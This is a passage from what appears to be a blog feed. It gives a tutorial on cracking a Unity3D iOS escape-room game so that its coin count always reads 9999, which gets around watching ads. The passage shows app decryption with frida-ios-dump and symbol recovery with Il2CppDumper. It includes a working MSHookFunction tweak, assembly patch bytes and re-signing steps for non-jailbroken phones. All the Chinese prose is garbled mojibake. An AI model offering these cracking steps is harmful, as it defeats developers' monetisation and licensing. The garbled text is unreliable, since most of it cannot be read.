arg1, arg2, arg3, arg4);</div><div class="line"><span class="comment">//%origæ‰§è¡ŒåŸå‡½æ•°é€»è¾‘,ä¹Ÿå¯ä»¥ä¿®æ”¹ä¼ å…¥å‚æ•°</span></div><div class="line">id result = %orig;</div><div class="line">NSLog(@<span class="string">"-------result:%@--------"</span>, result);</div><div class="line">NSLog(@<span class="string">"dddddddddddd"</span>);</div><div class="line"><span class="keyword">return</span> result;</div><div class="line">&#125;</div><div class="line"></div><div class="line">%end</div></pre></td></tr></table></figure>
<p>è¿™é‡Œä¸å¾—ä¸æä¸€ä¸‹class-dumpè¿˜æ˜¯å¾ˆæœ‰ç”¨çš„ï¼Œé€šè¿‡è¯¥å·¥å…·dumpå‡ºæ¥çš„ç±»å’Œå‡½æ•°ç”¨äºè¾…åŠ©Tweakæ’ä»¶ç¼–å†™å¤ªæ–¹ä¾¿äº†ï¼Œå‚æ•°ä¸ªæ•°ã€ç±»å‹ä»¥åŠè¿”å›å€¼ç±»å‹ä¸€ç›®äº†ç„¶ã€‚</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Tweak.jpg" alt=""></p>
<h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>æœ¬ç¯‡ä¸»è¦ç®€å•è®°å½•ä¸€ä¸‹è‡ªå·±Tweak Hookè¿‡ç¨‹ï¼Œç›¸å½“äºç•™ä¸ªç¬”è®°ï¼Œå¹¶æ²¡æœ‰å¤ªå¤šçš„æŠ€æœ¯åœ¨å†…ï¼Œåç»­æœ‰å…¶ä»–Tweakç”¨æ³•ä¼šåŠ è¿›å»ã€‚</p>
]]></content>
      <tags>
        <tag>iOS</tag>
        <tag>Hook</tag>
      </tags>
  </entry>
  <entry>
    <title>Unity3Dæ¸¸æˆä¿®æ”¹&amp;iOSå…è¶Šç‹±hook</title>
    <url>/2020/06/04/iOS%E5%85%8D%E8%B6%8A%E7%8B%B1hook&amp;Unity3D%E6%B8%B8%E6%88%8F%E4%BF%AE%E6%94%B9/</url>
    <content><![CDATA[<p>æ‰€è°“å…è¶Šç‹±Hookå°±æ˜¯åœ¨iOSè®¾å¤‡æœªè¿›è¡Œè¶Šç‹±æ“ä½œçš„å‰æä¸‹ï¼Œå¯¹APPè¿›è¡ŒHookæ“ä½œï¼Œå¾ˆä¹…ä¹‹å‰å°±æœ‰å¬è¯´è¿‡ï¼Œæ˜¨å¤©èŠ±äº†ä¸€å¤©æ—¶é—´æ•´ç¯å¢ƒå¤–åŠ æµ‹è¯•ï¼Œç„¶ååˆé¡ºå¸¦ä¿®æ”¹äº†ä¸€ä¸ªæ¯”è¾ƒè®©äººçƒ¦æ¼çš„æ¸¸æˆï¼ŒUnity3Dç ´è§£å…¶å®å¾ˆæ—©å°±æè¿‡äº†ï¼Œè¿™æ¬¡å€Ÿç€å…è¶Šç‹±Hookä¸€èµ·åˆ†äº«ç»™å¤§å®¶ã€‚</p>
<a id="more"></a>
<h1 id="å·¥æ¬²å–„å…¶äº‹å¿…å…ˆåˆ©å…¶å™¨"><a href="#å·¥æ¬²å–„å…¶äº‹å¿…å…ˆåˆ©å…¶å™¨" class="headerlink" title="å·¥æ¬²å–„å…¶äº‹å¿…å…ˆåˆ©å…¶å™¨"></a>å·¥æ¬²å–„å…¶äº‹å¿…å…ˆåˆ©å…¶å™¨</h1><ul>
<li>è¶Šç‹±iPhone(å¿…é¡»)<br>è™½ç„¶æœ€ç»ˆä¿®æ”¹ä¹‹åçš„APPæ˜¯è¦è£…åˆ°éè¶Šç‹±çš„iPhoneä¸Šï¼Œä½†æ˜¯APPéœ€è¦ç ¸å£³ï¼Œå¤–åŠ PPåŠ©æ‰‹ä¸‹æ¶ä¹‹åæ²¡å•¥å¥½åœ°æ–¹ä¸‹è½½ç ¸å£³ä¹‹åçš„ipaäº†ï¼Œå› æ­¤å¿…é¡»è¦æœ‰ä¸€éƒ¨è¶Šç‹±çš„iPhoneã€‚</li>
<li>æœªè¶Šç‹±iPhone<br>è¿™ä¸ªä¸ç”¨è¯´äº†ï¼Œç›®æ ‡APPå®‰è£…</li>
<li>MonKeyDev<br>AloneMonkeyå¤§ä½¬çš„ä½œå“ï¼ŒHookæ’ä»¶ç¼–å†™ç¥å™¨ï¼Œå¤§ä½¬è¿˜åœ¨å…¶ä¸­é›†æˆäº†iOSOpenDevï¼ŒåŒæ—¶ä¹Ÿæ˜¯éè¶Šç‹±æ’ä»¶å¼€å‘é›†æˆçš„ç¥å™¨ã€‚<a href="https://github.com/AloneMonkey/MonkeyDev/wiki/%E5%AE%89%E8%A3%85" target="_blank" rel="external">å®˜æ–¹å®‰è£…æŒ‡å—</a></li>
<li>frida-ios-dump<br>AloneMonkeyå¤§ä½¬çš„åˆä¸€åŠ›ä½œï¼Œç ¸å£³ç¥å™¨ï¼ŒiOSé€†å‘ä¸€å¹´å¤šäº†ï¼Œç›®å‰ä¸ºæ­¢æ— å¾€ä¸åˆ©<br>iOS fridaå®‰è£… <a href="https://frida.re/docs/ios/" target="_blank" rel="external">å®˜æ–¹å®‰è£…æŒ‡å—</a><br>frida-ios-dumpä½¿ç”¨ <a href="https://frida.re/docs/ios/" target="_blank" rel="external">é¡¹ç›®åœ°å€</a></li>
<li>IDA<br>åˆ†æç ¸å£³åçš„APPï¼Œå¯¼å…¥ç¬¦å·è¡¨pythonè„šæœ¬æ–¹ä¾¿åˆ†æ</li>
<li>Il2CppDumper<br><a href="https://github.com/Perfare/Il2CppDumper" target="_blank" rel="external">é¡¹ç›®åœ°å€</a><br>Unity3Dæ¸¸æˆåˆ†æåˆ©å™¨ï¼ŒUnityè½¬æ¢æˆIL2CPPçš„ç¬¦å·è¡¨æå–å·¥å…·ï¼Œç›®å‰åªæ”¯æŒWindowså¹³å°ï¼Œæœ€ç»ˆç”Ÿæˆçš„ç¬¦å·è¡¨è„šæœ¬å¯¼å…¥IDAç”¨</li>
<li>IPAPatch<br><a href="https://github.com/Naituw/IPAPatch" target="_blank" rel="external">é¡¹ç›®åœ°å€</a><br>ç”¨äºé‡æ–°æ‰“åŒ…ç­¾åipaå¹¶å®‰è£…åˆ°éè¶Šç‹±iPhoneä¸Šï¼Œéå¸¸å¼ºå¤§ã€‚å¦‚æœä¸æƒ³å†™Hookæ’ä»¶ï¼Œä¹Ÿå¯ä»¥é‡‡å–ä¿®æ”¹æ±‡ç¼–çš„æ–¹å¼é‡æ–°æ‰“åŒ…å®‰è£…ipa</li>
<li>æ±‡ç¼–ç è½¬æ¢å™¨<br><a href="http://www.pc6.com/softview/SoftView_594816.html" target="_blank" rel="external">ä¸‹è½½åœ°å€</a><br>å„ç§ç±»å‹æ±‡ç¼–ä»£ç ç”Ÿæˆæœºå™¨ç çš„å·¥å…·ï¼Œæ–¹ä¾¿é™æ€ä¿®æ”¹å¯æ‰§è¡Œæ–‡ä»¶ï¼Œé‡æ‰“åŒ…ç­¾åå®‰è£…</li>
</ul>
<h1 id="æŠ½ä¸å‰¥èŒ§"><a href="#æŠ½ä¸å‰¥èŒ§" class="headerlink" title="æŠ½ä¸å‰¥èŒ§"></a>æŠ½ä¸å‰¥èŒ§</h1><p>å¦‚æœä¸Šè¯‰å·¥å…·å…¨éƒ½å‡†å¤‡é½å…¨ï¼Œé‚£ä¹ˆå°±å°±å¯ä»¥å¼€å§‹é€†å‘å·¥ä½œäº†ï¼Œä½œä¸ºä¸€ä¸ªä¾¦æ¢å¯†ï¼Œå¹³æ—¶å–œæ¬¢ç©ä¸€äº›å¯†å®¤æ¸¸æˆï¼Œä»Šå¤©ä¿®æ”¹çš„è¿™æ¬¾æ¸¸æˆå«åšå¯†å®¤é€ƒè„±ç»å¢ƒç³»åˆ—â€“æ¸¸ä¹å›­ï¼Œä¸å¾—ä¸è¯´æƒ…èŠ‚è®¾è®¡çš„å¾ˆä¸é”™ï¼Œåœ¨ä¸€æ¬¡å°è¯•ä½¿ç”¨æç¤ºåŠŸèƒ½æ—¶ï¼Œçªç„¶å‘ç°éœ€è¦é‡‘å¸ï¼Œç„¶è€Œå…è´¹é‡‘å¸éœ€è¦çœ‹å¹¿å‘Šï¼Œæ¯æ¬¡åªç»™ä¸€æšï¼Œä½†æ˜¯æç¤ºçš„è¯è´¹ç¡®å®é€æ¸å¢é•¿çš„ï¼Œæ„Ÿè§‰æœ‰è¢«å†’çŠ¯åˆ°ï¼Œæ‰€ä»¥æœ‰äº†æ¥ä¸‹æ¥çš„ä¸€åˆ‡ã€‚</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook3.jpg" alt=""></p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook4.jpg" alt=""></p>
<h2 id="ç ¸å£³"><a href="#ç ¸å£³" class="headerlink" title="ç ¸å£³"></a>ç ¸å£³</h2><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦ç ¸å£³åçš„ipaè¿›è¡Œåˆ†æï¼Œå®šä½åˆ°åº•éœ€è¦ä¿®æ”¹ä»€ä¹ˆã€‚</p>
<p>ç«¯å£è½¬å‘</p>
<pre><code>iproxy 2222 22
</code></pre><p>é¦–å…ˆé€šè¿‡fridaæŸ¥æ‰¾è¦ç ¸å£³çš„APPè¿›ç¨‹</p>
<pre><code>Mac-mini:frida-ios-dump-master-2 $ frida-ps -U
 PID  Name
----  -------------------------------------------------
2911  App Store
2947  ä¿¡æ¯
2980  å¯†å®¤é€ƒè„±ç»å¢ƒç³»åˆ—11æ¸¸ä¹å›­
2936  å¾®ä¿¡
2972  è®¾ç½®
2949  é‚®ä»¶
2814  AppleIDAuthAgent
1412  AssetCacheLocatorService
</code></pre><p>æ¥ç€è¿è¡Œdump.pyå³å¯è„±å£³</p>
<pre><code>Mac-mini:frida-ios-dump-master-2 $ python2 dump.py å¯†å®¤é€ƒè„±ç»å¢ƒç³»åˆ—11æ¸¸ä¹å›­
Start the target app å¯†å®¤é€ƒè„±ç»å¢ƒç³»åˆ—11æ¸¸ä¹å›­
Dumping å¯†å®¤é€ƒè„±ç»å¢ƒç³»åˆ—11æ¸¸ä¹å›­ to /var/folders/m7/g2v2sbfd19g9kg7sk20n639h0000gn/T
start dump /var/containers/Bundle/Application/617F2079-957E-4005-92B8-7573FE651A8E/app1.app/app1
app1.fid: 100%|â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 35.7M/35.7M [00:07&lt;00:00, 5.03MB/s]
InfoPlist.strings: 213MB [00:44, 4.97MB/s]                                                                         
0.00B [00:00, ?B/s]Generating &quot;å¯†å®¤é€ƒè„±ç»å¢ƒç³»åˆ—11æ¸¸ä¹å›­.ipa&quot;
</code></pre><h2 id="Unity3Dç¬¦å·è¡¨æ¢å¤"><a href="#Unity3Dç¬¦å·è¡¨æ¢å¤" class="headerlink" title="Unity3Dç¬¦å·è¡¨æ¢å¤"></a>Unity3Dç¬¦å·è¡¨æ¢å¤</h2><p>åœ¨åšè¿™ä¸€æ­¥æ“ä½œä¹‹å‰ï¼Œæœºæ™ºçš„äººå·²ç»å°†å¯æ‰§è¡Œæ–‡ä»¶è„±åˆ°IDAæ–‡ä»¶ä¸­å¼€å§‹åˆ†æäº†ï¼ŒAPPè„±å£³åè§£å‹ipaï¼Œç„¶åæŸ¥çœ‹app1åŒ…å†…å®¹ï¼Œä¸»ç¨‹åºå¯æ‰§è¡Œæ–‡ä»¶ä½¿æˆ‘ä»¬é¦–è¦åˆ†æç›®æ ‡ï¼Œä¸€èˆ¬æ¥è¯´æ˜¯æ•´ä¸ªåŒ…ä¸­æœ€å¤§çš„é‚£ä¸ªæ–‡ä»¶ã€‚</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook5.jpg" alt=""></p>
<p>åœ¨IDAåˆ†æçš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬åˆšå¥½é€šè¿‡Il2CppDumperæ¥æå–ç¬¦å·è¡¨ï¼Œæå–ç¬¦å·è¡¨éœ€è¦ä¸¤ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ªæ˜¯ä¸Šè¿°çš„ä¸»ç¨‹åºå¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¦ä¸€ä¸ªåˆ™æ˜¯ç¬¦å·è¡¨æ–‡ä»¶global-metadata.datï¼ŒiOSä¸‹è¯¥æ–‡ä»¶ä½äºxxx.app/Data/Managed/Metadataç›®å½•ä¸‹</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook6.jpg" alt=""></p>
<p>å…ˆåé€‰æ‹©ä¸¤ä¸ªæ–‡ä»¶ä¹‹åï¼Œç¨‹åºè·³å‡ºéœ€è¦è¾“å…¥Unity version</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook7.png" alt=""></p>
<p>æˆ‘ä»¬æ€ä¹ˆç¡®è®¤åˆ°åº•æ˜¯ç”¨äº†ä»€ä¹ˆç‰ˆæœ¬çš„Unityå‘¢ï¼Œåªè¦åœ¨IDAé‡Œæœç´¢å­—ç¬¦ä¸²X-Unity-Versionå³å¯ï¼Œè°ƒç”¨çš„åœ°æ–¹ä¼šå‡ºç°ç‰ˆæœ¬å·ï¼Œæˆ‘ä»¬è¦æ‰¾çš„ç‰ˆæœ¬å·å³2018.4.3f1</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook8.png" alt=""></p>
<p>åœ¨è¾“å…¥ç‰ˆæœ¬å·ä¹‹åï¼Œé€‰æ‹©3å³å¯</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook9.png" alt=""></p>
<p>åŒæ—¶åœ¨Il2CppDumperçš„ç›®å½•ä¸‹ï¼Œä¼šç”Ÿæˆdump.cså’Œscript.pyä¸¤ä¸ªæ–‡ä»¶</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook10.png" alt=""></p>
<p>å°†script.pyå¯¼å…¥IDAï¼ŒFileâ€”â€”&gt;Script Fileâ€”â€”&gt;é€‰æ‹©script.py<br>è¯¥è„šæœ¬çš„ä¸»è¦ä½œç”¨æ˜¯è¾…åŠ©IDAè¯†åˆ«IL2CPPè¡¨å‡½æ•°åï¼Œåœ¨åŠ è½½è„šæœ¬ä¹‹å‰IDAè¯†åˆ«çš„å‡½æ•°å½¢å¦‚sub_xxxxxxx</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook11.png" alt=""></p>
<p>åŠ è½½è„šæœ¬ä¹‹åå¯¹å‡½æ•°è¿›è¡Œäº†æ ‡è®°å½¢æˆæ ¼å¼å¦‚ç±»å$$å‡½æ•°åè¿™æ ·çš„å‡½æ•°</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook12.png" alt=""></p>
<h2 id="å®šä½ä¿®æ”¹ç‚¹"><a href="#å®šä½ä¿®æ”¹ç‚¹" class="headerlink" title="å®šä½ä¿®æ”¹ç‚¹"></a>å®šä½ä¿®æ”¹ç‚¹</h2><p>åœ¨å°†script.pyå¯¼å…¥IDAä¹‹åï¼Œæˆ‘ä»¬ç«‹åˆ»ç€æ‰‹åˆ†ædump.csè¿™ä¸ªæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶é‡Œé¢è§£æäº†æ¸¸æˆç›¸å…³çš„å±æ€§å’Œå‡½æ•°ã€‚å¯ä»¥ç”¨C#å·¥å…·æ‰“å¼€ï¼Œæˆ‘è¿™é‡Œç›´æ¥ç”¨sourceæ‰“å¼€åˆ†æã€‚</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook13.png" alt=""></p>
<p>ä¸å…¶è¯´æ˜¯åˆ†æï¼Œä¸å¦‚è¯´æ˜¯æŸ¥æ‰¾æ›´ä¸ºå‡†ç¡®ä¸€äº›ï¼Œæˆ‘ä»¬æƒ³è¦ä¿®æ”¹çš„æœ€ç»ˆç›®çš„è‚¯å®šæ˜¯æ‹¥æœ‰æ°¸è¿œèŠ±ä¸å®Œçš„é‡‘å¸ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å»é’ˆå¯¹é‡‘å¸å»æœç´¢å®šä½ï¼Œæˆ‘æœç´¢äº†Goldï¼Œå®šä½åˆ°æœ‰ä¸€ä¸ªå‡½æ•°ä¸ºget_Goldè¾ƒä¸ºå¯ç–‘</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook16.png" alt=""></p>
<p>åœ¨IDAå®šä½åˆ°å‡½æ•°åœ°å€</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook15.png" alt=""></p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook14.png" alt=""></p>
<p>ä¹‹åé€šè¿‡lldbä¸‹æ–­ç‚¹è°ƒè¯•ï¼Œå‘ç°åœ¨æ‰“å¼€æç¤ºçš„æ—¶å€™è§¦å‘äº†æ–­ç‚¹ï¼Œè¿æ°”ä¸é”™ï¼Œè¿”å›ä¸Šå±‚è°ƒç”¨æŸ¥çœ‹ç»“æœä¸º0ï¼Œä¹‹åå»çœ‹äº†ä¸ªä¸¤ä¸ªè§†é¢‘è·å¾—äº†ä¸¤ä¸ªé‡‘å¸ä¹‹åï¼Œè¿”å›å€¼æœç„¶å˜æˆäº†2ï¼Œå¯ç–‘ç¡®å®šç¨‹åºå°±æ˜¯é€šè¿‡è¿™ä¸ªå‡½æ•°æ¥è·å–é‡‘å¸çš„æ•°é‡ã€‚</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook17.jpg" alt=""></p>
<h1 id="ç›´æ£é»„é¾™"><a href="#ç›´æ£é»„é¾™" class="headerlink" title="ç›´æ£é»„é¾™"></a>ç›´æ£é»„é¾™</h1><p>åˆ†æå®šä½ä¿®æ”¹ç‚¹ä¹‹åï¼Œå°±å¯ä»¥å¯¹æ¸¸æˆè¿›è¡Œä¿®æ”¹äº†ï¼ŒåŸæœ¬æ˜¯æƒ³é€šè¿‡å…è¶Šç‹±Hookå®ç°å¯¹æ¸¸æˆçš„ä¿®æ”¹ï¼Œä½†æ˜¯å°è¯•äº†å¤šæ¬¡ä¸€ç›´hookä¸æˆåŠŸï¼Œå¤šæ¬¡æŸ¥æ‰¾å‘ç°æœªè¶Šç‹±iOSå¹¶ä¸æ”¯æŒMSHookFunctionæ–¹å¼è¿›è¡Œhookï¼ŒåŒæ—¶æ²¡æ³•å¯¹å½¢å¦‚sub_xxxxxå‡½æ•°è¿›è¡Œinlinehookã€‚<br>è¿™é‡Œä»‹ç»ä¸¤ç§ä¿®æ”¹æ–¹å¼ï¼Œä¸€ç§æ˜¯é€šè¿‡iOSè¶Šç‹±Hookæ¥å®ç°å¯¹å…³é”®å‡½æ•°çš„Hookä¿®æ”¹ï¼Œä¸»è¦ä¾èµ–äºMonkeyDevï¼Œæ¸¸æˆä¿®æ”¹äº†ä¹‹åè‚¯å®šä¸ä¼šå¤©å¤©æŠ±ç€ä¸€ä¸ªè¶Šç‹±æ‰‹æœºæ¥ç©ï¼Œæ‰€ä»¥è¿™é‡Œå‡†å¤‡çš„å¦ä¸€ç§ç§ä¿®æ”¹æ–¹å¼æ˜¯é’ˆå¯¹æœªè¶Šç‹±æ‰‹æœºçš„ï¼Œé€šè¿‡ç›´æ¥ä¿®æ”¹æ±‡ç¼–ï¼Œé‡æ‰“åŒ…ç­¾åipaå®‰è£…åˆ°æ‰‹æœºä¸Šï¼Œä¸»è¦ä¾èµ–äºIPAPatch</p>
<h2 id="iOSè¶Šç‹±ä¿®æ”¹"><a href="#iOSè¶Šç‹±ä¿®æ”¹" class="headerlink" title="iOSè¶Šç‹±ä¿®æ”¹"></a>iOSè¶Šç‹±ä¿®æ”¹</h2><p>iOSè¶Šç‹±æ’ä»¶çš„ç¼–å†™è¿™é‡Œé‡‡ç”¨MonKeyDevï¼Œå¦‚ä½•ä½¿ç”¨å¯è§<a href="https://github.com/AloneMonkey/MonkeyDev/wiki/%E5%BC%80%E5%A7%8B%E4%BD%BF%E7%94%A8" target="_blank" rel="external">å®˜æ–¹æ–‡æ¡£</a></p>
<h3 id="æ³¨æ„äº‹é¡¹"><a href="#æ³¨æ„äº‹é¡¹" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h3><ul>
<li>åœ¨hookä¸åŒAPPæ—¶å°†Tweakçš„plistä¸­Bundlesä¿®æ”¹åº”ç”¨å¯¹åº”çš„Bundleid</li>
<li>åœ¨Build Settingsâ€”â€”&gt;User-Definedæ–°å»ºé¡¹CODE_SIGNING_ALLOWEDï¼Œèµ‹å€¼ä¸ºNOï¼Œå¦åˆ™ç¼–è¯‘ä¼šæŠ¥é”™</li>
<li>Fileâ€”â€”&gt;Project Settingå°†Build Systemä¿®æ”¹ä¸ºLegacy Build Systemå¦åˆ™ç¼–è¯‘æŠ¥é”™</li>
<li>åˆ‡è®°å®‰è£…sshpass</li>
</ul>
<h3 id="æ’ä»¶ç¼–å†™"><a href="#æ’ä»¶ç¼–å†™" class="headerlink" title="æ’ä»¶ç¼–å†™"></a>æ’ä»¶ç¼–å†™</h3><p>MonKeyDevæ”¯æŒå¤šç§Hookæ¡†æ¶ï¼Œæˆ‘è¿™é‡Œä½¿ç”¨Tweakæ’ä»¶ã€‚<br>å…·ä½“hookä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="meta">#import <span class="meta-string">&lt;substrate.h&gt;</span></span></div><div class="line"><span class="meta">#import <span class="meta-string">&lt;dlfcn.h&gt;</span></span></div><div class="line"><span class="meta">#import <span class="meta-string">&lt;mach-o/dyld.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="comment">// ç”¨äºä¿å­˜åŸå‡½æ•°æŒ‡é’ˆ</span></div><div class="line"><span class="keyword">int</span> (*old_get_Gold)();</div><div class="line"></div><div class="line"><span class="comment">// æ–°å‡½æ•°</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">new_get_Gold</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line"><span class="keyword">return</span> <span class="number">9999</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">%ctor&#123;</div><div class="line"><span class="comment">// æ‰§è¡Œhook</span></div><div class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> Gold = <span class="number">_</span>dyld_get_image_vmaddr_slide(<span class="number">0</span>) + <span class="number">0x1011aa060</span>;</div><div class="line">MSHookFunction((<span class="keyword">void</span> *)Gold, (<span class="keyword">void</span> *)&amp;new_get_Gold, (<span class="keyword">void</span> **)&amp;old_get_Gold);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="iOSæœªè¶Šç‹±ä¿®æ”¹"><a href="#iOSæœªè¶Šç‹±ä¿®æ”¹" class="headerlink" title="iOSæœªè¶Šç‹±ä¿®æ”¹"></a>iOSæœªè¶Šç‹±ä¿®æ”¹</h2><h3 id="ä¿®æ”¹æ±‡ç¼–"><a href="#ä¿®æ”¹æ±‡ç¼–" class="headerlink" title="ä¿®æ”¹æ±‡ç¼–"></a>ä¿®æ”¹æ±‡ç¼–</h3><p>é¦–å…ˆæŸ¥çœ‹get_Goldå‡½æ•°è¿”å›ä½ç½®æ±‡ç¼–ï¼Œè¿”å›æ—¶ä¼ å…¥X1è¿›è¡Œç»è¿‡å‡½æ•°è½¬æ¢ä¸ºintè¿”å›ï¼Œé‚£ä¹ˆå¯ä»¥å°†9999ä¼ å…¥X0ï¼Œç„¶åç›´æ¥retå³å¯</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook21.png" alt=""></p>
<p>é€šè¿‡æ±‡ç¼–æŒ‡ä»¤ç”Ÿæˆå·¥å…·ç”Ÿæˆæˆ‘ä»¬éœ€è¦çš„æœºå™¨ç </p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook22.png" alt=""></p>
<p>retçš„æœºå™¨ç ä¸ºC0 03 5F D6 </p>
<p>æœ€åä¿®æ”¹å¯¹åº”åœ°å€çš„æœºå™¨ç å³å¯</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook25.png" alt=""></p>
<h3 id="é‡æ‰“åŒ…ç­¾å"><a href="#é‡æ‰“åŒ…ç­¾å" class="headerlink" title="é‡æ‰“åŒ…ç­¾å"></a>é‡æ‰“åŒ…ç­¾å</h3><p>å°†ä¿®æ”¹åçš„app1å¯æ‰§è¡Œæ–‡ä»¶é‡æ–°æ”¾å›åŸå¤„ï¼Œå°†è§£å‹åçš„ipaåŒ…é‡æ–°å‹ç¼©ï¼Œæœ€ç»ˆæ”¹åä¸ºapp.ipa,å°†è¯¥æ–‡ä»¶æ”¾åˆ°IPAPatchçš„Assetsç›®å½•ä¸‹ï¼Œæ›¿æ¢æ‰åŸæœ¬çš„app.ipaæ–‡ä»¶ã€‚</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook23.jpg" alt=""></p>
<p>æœ€ç»ˆå®‰è£…åˆ°æœªè¶Šç‹±æ‰‹æœºä¸Šæ•ˆæœå¦‚ä¸‹</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook24.jpg" alt=""></p>
<h1 id="éš”å±±æ‰“ç‰›"><a href="#éš”å±±æ‰“ç‰›" class="headerlink" title="éš”å±±æ‰“ç‰›"></a>éš”å±±æ‰“ç‰›</h1><p>iOSå…è¶Šç‹±hookä¸»è¦æ˜¯é€šè¿‡iosOpenDevç”Ÿæˆdylibæ³¨å…¥ç›®æ ‡APPå®ç°Hookï¼ŒiosOpenDevæ˜¯appleå®˜æ–¹æ”¯æŒçš„æ’ä»¶ç”Ÿæˆå·¥å…·ï¼Œå¯ç›´æ¥ç”±Xcodeç”Ÿæˆã€‚å¯ç”ŸæˆCaptainHookTweakã€Logos Tweakä¸¤ç§dylibã€‚åœ¨æ³¨å…¥dylibä¹‹åå¯¹APPè¿›è¡Œé‡æ‰“åŒ…ç­¾åã€‚</p>
<p>æˆ‘ä»¬æ¥ä¸‹æ¥ç”¨åˆ°çš„MonKeyDevæ˜¯å¯¹åŸæœ‰iOSOpenDevçš„å‡çº§ï¼Œæ›´åŠ æ–¹ä¾¿äºéè¶Šç‹±æ’ä»¶çš„ç¼–å†™ã€‚</p>
<h3 id="æ–°å»ºé¡¹ç›®-amp-ç¼–è¯‘"><a href="#æ–°å»ºé¡¹ç›®-amp-ç¼–è¯‘" class="headerlink" title="æ–°å»ºé¡¹ç›®&amp;ç¼–è¯‘"></a>æ–°å»ºé¡¹ç›®&amp;ç¼–è¯‘</h3><p>MonKeyDevå®‰è£…å®Œæˆä¹‹åï¼Œæ‰“å¼€Xcodeæ–°å»ºé¡¹ç›®ï¼Œæ»‘åŠ¨åˆ°æœ€ä¸‹æ–¹å¯ä»¥çœ‹åˆ°MonKeyDevæä¾›çš„æ¨¡å—ï¼Œé€‰æ‹©ç¬¬ä¸€ä¸ªã€‚</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook18.jpg" alt=""></p>
<p>æ–°å»ºä¹‹åéœ€è¦é…ç½®Generalâ€”â€”&gt;Signingï¼Œè®¾ç½®è‡ªå·±çš„AppleIDåç»­ç”¨äºç­¾åã€‚</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook19.jpg" alt=""></p>
<p>æ¥ä¸‹æ¥å°†ç ¸å£³åçš„ipaæˆ–ipaè§£å‹åçš„xxx.appæ”¾å…¥Your_P<br>roject/TargetAppç›®å½•ä¸‹ï¼Œç¼–è¯‘æ•´ä¸ªé¡¹ç›®ï¼Œæœ€ç»ˆå®‰è£…åˆ°æœªè¶Šç‹±æ‰‹æœºä¸Šä¿¡ä»»ä¹‹åæ­£å¸¸è¿è¡Œè¡¨æ˜ç­¾åæˆåŠŸã€‚</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook20.jpg" alt=""></p>
<h3 id="å¯»æ‰¾æ³¨å…¥ç‚¹Hook"><a href="#å¯»æ‰¾æ³¨å…¥ç‚¹Hook" class="headerlink" title="å¯»æ‰¾æ³¨å…¥ç‚¹Hook"></a>å¯»æ‰¾æ³¨å…¥ç‚¹Hook</h3><p>è™½ç„¶æœ€ç»ˆæ²¡èƒ½æˆåŠŸå®ç°å…è¶Šç‹±hookä¿®æ”¹æ¸¸æˆï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜æ˜¯æ‹¿å®ƒä¸‹æ‰‹</p>
